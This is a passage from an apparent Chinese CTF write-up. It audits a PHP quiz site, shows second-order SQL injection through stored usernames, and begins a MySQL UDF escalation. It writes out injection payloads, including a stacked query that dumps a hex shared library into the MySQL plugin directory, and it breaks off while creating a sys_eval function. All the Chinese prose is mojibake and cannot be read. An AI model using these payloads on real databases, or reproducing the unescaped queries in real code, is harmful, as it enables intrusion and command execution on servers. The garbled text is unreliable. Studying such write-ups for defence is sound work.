  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span> <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token delimiter important">?></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span>æ‚¨å·²å®Œæˆæµ‹è¯•<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span>æŸ¥è¯¢<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui--appbar-height<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>score.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>æˆç»©<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>æˆ–<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui--appbar-height<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>rank.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>æ’å<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>
    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                              <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token operator">...</span><span class="token operator">...</span>
  
<span class="token operator">&lt;</span><span class="token operator">?</span>php <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token delimiter important">?></span></span>
  // æ²¡ç™»å½•å±•ç¤ºå¦‚ä¸‹
  è¯·å…ˆ<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui--appbar-height<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>login.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> ç™»é™†<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>
  æˆ–<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui--appbar-height<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>register.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> æ³¨å†Œ<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
  æŸ¥è¯¢<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui--appbar-height<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>score.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>æˆç»©<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>æˆ–<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui--appbar-height<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>rank.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>æ’å<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>
  <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">endif</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre>

<p>æ¥ç€å°±æ˜¯æ²¡åšè¿‡é¢˜çš„æ™®é€šç”¨æˆ·æµç¨‹ï¼Œä¸€æ®µè”åˆæŸ¥è¯¢è¯­å¥æŸ¥å‡ºè¯¥ç”¨æˆ·æŠ½çš„é¢˜ç›®å¹¶ä»é¢˜åº“challengesAllä¸­æŠ½å‡ºè¿™äº›é¢˜ç›®å†å±•ç¤º</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT
  type,Title,TitleImg,OptionA,OptionB,OptionC,OptionD
  FROM
  challengesAll,randChallenges 
  WHERE
  randChallenges.username = '"</span><span class="token operator">.</span><span class="token function">addslashes_deep</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"'
  AND (challengesAll.id = randChallenges.challengeId1 
       OR challengesAll.id = randChallenges.challengeId2 
       OR challengesAll.id = randChallenges.challengeId3 
       OR challengesAll.id = randChallenges.challengeId4 
       OR challengesAll.id = randChallenges.challengeId5)"</span><span class="token punctuation">)</span> <span class="token comment">// å¾ˆè¹©è„šçš„æŸ¥è¯¢</span></code></pre>

<p>æ¥ç€è§£æï¼Œå•é€‰é¢˜å’Œåˆ¤æ–­é¢˜æœ‰ä¸åŒçš„å±•ç¤ºæ–¹å¼ï¼Œåˆ°ç›®å‰ä¸ºæ­¢éƒ½å¾ˆæ­£å¸¸ã€‚</p>
<p>ä¸‹é¢å°±æ˜¯åˆ¤åˆ†äº†ï¼ŒåŸå…ˆè¿™é‡Œæ²¡åšåˆ¤æ–­ï¼Œåº”è¯¥å¢åŠ åˆ¤æ–­q1-5æ˜¯å¦åˆæ³•ï¼Œé˜²æ­¢ç›´æ¥åœ¨é€‰é¡¹å¤„å°±å¼€å§‹æ³¨å…¥ä»è€Œè·³è¿‡è€ƒç‚¹äº†ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæœ‰çš„å¸ˆå‚…ä¼šç–‘é—®ä¸ºä»€ä¹ˆæœ‰äºŒæ¬¡æ³¨å…¥è€ƒç‚¹çš„é—®é¢˜ã€‚</p>
<p>ç„¶åå°±æ˜¯å‡ºç°é—®é¢˜çš„åœ°æ–¹äº†ï¼Œé€šè¿‡å®¡è®¡å¯ä»¥å‘ç°åœ¨$queryçš„ç¬¬äºŒå¥<code>$_SESSION[&#39;username&#39;]</code>æ²¡æœ‰åšè½¬ä¹‰ï¼Œè€Œåœ¨loginå¤„å¯ä»¥å‘ç°<code>$_SESSION[&#39;username&#39;]==($row[&#39;username&#39;])</code>å¦‚æ­¤ä¸€æ¥æˆ‘ä»¬å­˜å…¥æ•°æ®åº“çš„usernameè¢«æå–å‡ºæ¥ï¼Œç„¶åæœªç»è¿‡è½¬ä¹‰å°±å†æ¬¡æ’å…¥åˆ°äº†sqlè¯­å¥ä¸­ï¼Œä»è€Œé€ æˆäº†äºŒæ¬¡æ³¨å…¥çš„æ¼æ´ã€‚</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">// å…ˆæŸ¥ä¸€ä¸‹æ˜¯å¦å·²ç»å®Œæˆè¿‡æµ‹è¯•ï¼Œé˜²æ­¢ä¸€ä¸ªç”¨æˆ·æœ‰å¤šæ¡ç»“æœ</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select * from score where username='"</span><span class="token operator">.</span><span class="token function">addslashes_deep</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert(\"ç”¨æˆ·å·²å®Œæˆæµ‹è¯•\");&lt;/script>"</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// å¯ä»¥çœ‹åˆ°åœ¨ç¬¬äºŒå¥ä¸­$_SESSION['username</span><span class="token string single-quoted-string">']æœªåšè½¬ä¹‰
    // è¿™é‡Œq1-5åç»­å¢åŠ äº†åˆæ³•æ€§åˆ¤æ–­
    $query = "insert into score values (NULL, '</span><span class="token string double-quoted-string">".addslashes_deep(<span class="token interpolation"><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span></span>)."</span><span class="token string single-quoted-string">', $getscroe);
            insert into userAnswer values (NULL, '</span><span class="token string double-quoted-string">".<span class="token interpolation"><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span></span>."</span><span class="token string single-quoted-string">', '</span><span class="token string double-quoted-string">".<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q1'</span><span class="token punctuation">]</span></span>."</span><span class="token string single-quoted-string">', '</span><span class="token string double-quoted-string">".<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q2'</span><span class="token punctuation">]</span></span>."</span><span class="token string single-quoted-string">', '</span><span class="token string double-quoted-string">".<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q3'</span><span class="token punctuation">]</span></span>."</span><span class="token string single-quoted-string">', '</span><span class="token string double-quoted-string">".<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q4'</span><span class="token punctuation">]</span></span>."</span><span class="token string single-quoted-string">', '</span><span class="token string double-quoted-string">".<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q5'</span><span class="token punctuation">]</span></span>."</span><span class="token string single-quoted-string">')";
    //            var_dump($query);
    //            exit(1);
    if ($mysqli->multi_query($query)===TRUE) &#123;
      $mysqli->close();
      echo "&lt;script>alert(\"å·²å®Œæˆæµ‹è¯•ï¼\");&lt;/script>";
      echo "&lt;script language='</span>JavaScript<span class="token string single-quoted-string">'>location.replace('</span>index<span class="token operator">.</span>php'<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token string double-quoted-string">";
    &#125; else &#123;
      exit("</span>something err0rï¼"<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h4 id="score"><a href="#score" class="headerlink" title="score"></a>score</h4><p>è·å–äº†adminæˆ‘ä»¬å°±å¯ä»¥æŸ¥è¯¢å¯¹åº”ç”¨æˆ·çš„æˆç»©äº†</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'studentid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token comment">// å¯¹ä¼ å…¥studentidè½¬ä¹‰ï¼Œæ²¡å•¥é—®é¢˜</span>
  <span class="token variable">$studentid</span> <span class="token operator">=</span> <span class="token function">addslashes_deep</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'studentid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">//            var_dump($studentid);</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">connect_errno</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"something err0rï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token comment">// é¦–å…ˆå»usersè¡¨æŸ¥studentidå¯¹åº”çš„username</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select * from users where studentid='<span class="token interpolation"><span class="token variable">$studentid</span></span>';"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token comment">// æ‹¿æŸ¥åˆ°çš„usernameå»æŸ¥å¯¹åº”æˆç»©</span>
      <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from score where username='<span class="token interpolation"><span class="token variable">$username</span></span>';"</span><span class="token punctuation">;</span>
      <span class="token operator">...</span>
      <span class="token operator">...</span></code></pre>

<p>å¾ˆæ˜æ˜¾åœ¨ä¸Šé¢ğŸ‘†è¿™æ®µä¸­ä¹Ÿæ˜¯éå¸¸ç»å…¸çš„äºŒæ¬¡æ³¨å…¥ã€‚ç”±äºscoreè¡¨ä¸­å­˜çš„æ˜¯<code>username</code>å’Œæˆç»©çš„æ˜ å°„ï¼Œè€Œè¿™é‡Œæ˜¯è¾“å…¥å­¦å·æŸ¥è¯¢ï¼ŒæŸ¥è¯¢è¯­å¥æ²¡æœ‰åšjoinï¼Œè€Œæ˜¯å…ˆæŸ¥usersè¡¨æ‹¿åˆ°<code>username</code>å†æŸ¥scoreï¼Œæˆ‘ä»¬çš„<code>username</code>å¯æ˜¯ç»è¿‡è½¬ä¹‰å­˜å…¥è¡¨ä¸­çš„ï¼Œæ‹¿å‡ºæ¥æœªåšè½¬ä¹‰ç›´æ¥æ’å…¥äº†å¦ä¸€å¥sqlè¯­å¥ä¸­ï¼Œä»è€Œé€ æˆäº†äºŒæ¬¡æ³¨å…¥ã€‚</p>
<p>è¿˜æœ‰ä¸€ä¸ªå°ç»†èŠ‚ï¼Œåœ¨å»ºè¡¨çš„æ—¶å€™å¯ä»¥çœ‹è§<code>username</code>æ˜¯mediumtextè€Œä¸æ˜¯varcharï¼Œä¹Ÿå¯ä»¥çŒœåˆ°è¿™é‡Œæœ‰é—®é¢˜äº†</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token keyword">EXISTS</span> <span class="token identifier"><span class="token punctuation">`</span>users<span class="token punctuation">`</span></span><span class="token punctuation">;</span>
<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token identifier"><span class="token punctuation">`</span>users<span class="token punctuation">`</span></span> <span class="token punctuation">(</span>
  <span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token keyword">unsigned</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token punctuation">,</span>
  <span class="token identifier"><span class="token punctuation">`</span>username<span class="token punctuation">`</span></span> <span class="token keyword">mediumtext</span><span class="token punctuation">,</span>
  <span class="token identifier"><span class="token punctuation">`</span>studentid<span class="token punctuation">`</span></span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
  <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token keyword">UNIQUE</span> <span class="token keyword">KEY</span> <span class="token identifier"><span class="token punctuation">`</span>studentid<span class="token punctuation">`</span></span> <span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>studentid<span class="token punctuation">`</span></span><span class="token punctuation">)</span>
<span class="token punctuation">)</span> <span class="token keyword">ENGINE</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">11</span> <span class="token keyword">DEFAULT</span> <span class="token keyword">CHARSET</span><span class="token operator">=</span>utf8<span class="token punctuation">;</span></code></pre>

<h4 id="å‰©ä¸‹çš„ç½‘é¡µ-amp-æ¥ä¸‹æ¥çš„æ€è·¯"><a href="#å‰©ä¸‹çš„ç½‘é¡µ-amp-æ¥ä¸‹æ¥çš„æ€è·¯" class="headerlink" title="å‰©ä¸‹çš„ç½‘é¡µ &amp; æ¥ä¸‹æ¥çš„æ€è·¯"></a>å‰©ä¸‹çš„ç½‘é¡µ &amp; æ¥ä¸‹æ¥çš„æ€è·¯</h4><h5 id="config"><a href="#config" class="headerlink" title="config"></a>config</h5><p>å­˜äº†æ•°æ®åº“è¿æ¥ä¿¡æ¯å’Œä¿©å‡½æ•°ï¼Œä¸€ä¸ªæ˜¯è½¬ä¹‰çš„ä¸€ä¸ªæ˜¯æ£€æŸ¥qåˆæ³•æ€§çš„</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">addslashes_deep</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'addslashes_deep'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">addslashes</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">checkQ</span><span class="token punctuation">(</span><span class="token variable">$q</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$q</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"4"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h5 id="logout"><a href="#logout" class="headerlink" title="logout"></a>logout</h5><p>é€€å‡ºç™»å½•</p>
<h5 id="rank"><a href="#rank" class="headerlink" title="rank"></a>rank</h5><p>æŸ¥çœ‹æ’è¡Œï¼Œè¯­å¥å†™æ­»çš„ï¼Œæ²¡æœ‰æ“ä½œç©ºé—´</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select * from score order by score desc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<h5 id="æ¥ä¸‹æ¥çš„æ€è·¯"><a href="#æ¥ä¸‹æ¥çš„æ€è·¯" class="headerlink" title="æ¥ä¸‹æ¥çš„æ€è·¯"></a>æ¥ä¸‹æ¥çš„æ€è·¯</h5><p>ç›¸ä¿¡åšåˆ°è¿™ä¸€æ­¥çš„å¸ˆå‚…ä»¬è‚¯å®šæ•°æ®åº“ä¹Ÿçœ‹è¿‡äº†ï¼Œå½“ç„¶æ¯•ç«Ÿæ˜¯æ–°ç”Ÿèµ›ï¼Œç½‘é¡µå…¨éƒ¨æºç æ•°æ®åº“æ–‡ä»¶å’Œé…ç½®æ–‡ä»¶å…¨éƒ¨éƒ½ç»™å¤§å®¶äº†ï¼Œè€ƒéªŒçš„å°±æ˜¯çœ‹å¤§å®¶çš„ç»†å¿ƒç¨‹åº¦</p>
<p>init.sqlæ–‡ä»¶å¯ä»¥çœ‹åˆ°åœ¨ctfè¡¨ä¸­æœ‰è¿™æ ·ä¸€æ¡è®°å½•</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">BEGIN</span><span class="token punctuation">;</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token identifier"><span class="token punctuation">`</span>ctf<span class="token punctuation">`</span></span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'flag'</span><span class="token punctuation">,</span> <span class="token string">'flag_in_/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">COMMIT</span><span class="token punctuation">;</span></code></pre>

<p>flagåœ¨æ ¹ç›®å½•ï¼Ÿé‚£ä¸å°±æ˜¯è¦load_fileè¯»æ–‡ä»¶å—ã€‚é‚£å†çœ‹ä¸€ä¸‹æƒé™</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">GRANT</span> <span class="token keyword">file</span><span class="token punctuation">,</span><span class="token keyword">insert</span> <span class="token keyword">ON</span> <span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span></code></pre>

<p>å¯ä»¥æ–‡ä»¶è½åœ°ï¼Œä¹Ÿæœ‰insertæƒé™</p>
<p>å†çœ‹ä¸€ä¸‹ç›®å½•</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">secure<span class="token operator">-</span><span class="token keyword">file</span><span class="token operator">-</span>priv<span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>lib64<span class="token operator">/</span>mysql<span class="token operator">/</span>plugin</code></pre>

<p>è™½ç„¶ä¸ä¸ºç©ºï¼Œä½†çœ‹åˆ°pluginåº”è¯¥å¾ˆæ•æ„Ÿï¼Œåœ¨æ’ä»¶ç›®å½•ä¸‹ï¼Œå¯ä»¥æ–‡ä»¶è½åœ°ï¼Œè¦è¯»æ–‡ä»¶ï¼Œå¾ˆæ˜æ˜¾é‚£å°±æ˜¯ç”¨udfæˆ–è€…mofäº†</p>
<p>è¿™é‡Œæä¸€å¥ï¼Œå¦‚æœæ²¡é™åˆ¶ç›®å½•ä½†flagå»äº†æƒé™ï¼Œé‚£æœ‰å¸ˆå‚…å°±ä¼šæƒ³å»åœ¨webç›®å½•ä¸‹è½åœ°ä¸ªwebshellï¼Œä½†è¿™é‡Œéƒ¨ç½²æ˜¯ç«™åº“åˆ†ç¦»çš„ï¼Œåé¢ä¹Ÿä¼šè®²è¿™ä¸€ç‚¹ï¼ŒmysqlæœåŠ¡å™¨åœ¨å†…ç½‘å¯å‡ºç½‘ï¼Œæ²¡æœ‰webæœåŠ¡ï¼Œé—®é¢˜æ¥äº†ï¼Œå¦‚æœä¸å¯å‡ºç½‘è¯¥æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿè¿™é‡Œç•™ä¸€ä¸ªæ€è€ƒçš„é—®é¢˜ã€‚</p>
<h4 id="è½åœ°-soæ–‡ä»¶"><a href="#è½åœ°-soæ–‡ä»¶" class="headerlink" title="è½åœ°.soæ–‡ä»¶"></a>è½åœ°.soæ–‡ä»¶</h4><p>ç”±äºæœåŠ¡å™¨æ˜¯linuxçš„ï¼Œæˆ‘ä»¬å°±è¦å†™.soæ–‡ä»¶åœ¨pluginç›®å½•ä¸‹ï¼Œå¦‚æœæ˜¯windowså°±è¦å†™.dllæ–‡ä»¶</p>
<p>sqlmapå…¶å®è‡ªå¸¦ææƒè„šæœ¬ï¼Œä½†æ²¡æ³•ç›´æ¥åˆ©ç”¨ï¼ŒæŠŠå®ƒçš„.soæ–‡ä»¶å¯¼å‡ºåhexå–å…¶å€¼æ¥ä¸‹æ¥ä¼šç”¨åˆ°</p>
<p>å·²ç»æœ‰adminäº†æ‰€ä»¥æ“ä½œä¼šç®€å•å¾ˆå¤šï¼Œè¯­å¥ä¸º</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> score <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'$username'</span><span class="token punctuation">;</span></code></pre>

<p>é‚£æˆ‘ä»¬æ³¨å†Œä¸€ä¸ªå­¦å·ä¸º1ï¼Œç”¨æˆ·åä¸º<code>a&#39;;select 123#</code>çš„ç”¨æˆ·ï¼Œç„¶åå»æŸ¥å¯¹åº”çš„å­¦å·å°±è¡Œäº†</p>
<p>æˆ‘ä»¬æŠŠ.soæ–‡ä»¶å†™å…¥åˆ°pluginç›®å½•ä¸‹</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># å†™.soæ–‡ä»¶</span>
a<span class="token string">';select &lt;0x7F...åˆšæ‰è·å–çš„hexå€¼> into dumpfile '</span><span class="token operator">/</span>usr<span class="token operator">/</span>lib64<span class="token operator">/</span>mysql<span class="token operator">/</span>plugin<span class="token operator">/</span>exp<span class="token punctuation">.</span>so'<span class="token punctuation">;</span><span class="token comment">#</span></code></pre>

<h4 id="åˆ›å»ºudf-amp-å‘½ä»¤æ‰§è¡Œ"><a href="#åˆ›å»ºudf-amp-å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="åˆ›å»ºudf &amp; å‘½ä»¤æ‰§è¡Œ"></a>åˆ›å»ºudf &amp; å‘½ä»¤æ‰§è¡Œ</h4><p>ä¸¤å¥è¯å®Œæˆï¼Œè¿˜æ˜¯åˆ©ç”¨scoreé¡µé¢çš„äºŒæ¬¡æ³¨å…¥</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># åˆ›å»ºudfï¼Œè¿™é‡Œé»˜è®¤ä¼šä»pluginç›®å½•ä¸‹æ‰¾.soæ–‡ä»¶ï¼Œåˆ›å»ºä¸€ä¸ªç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°sys_eval</span>
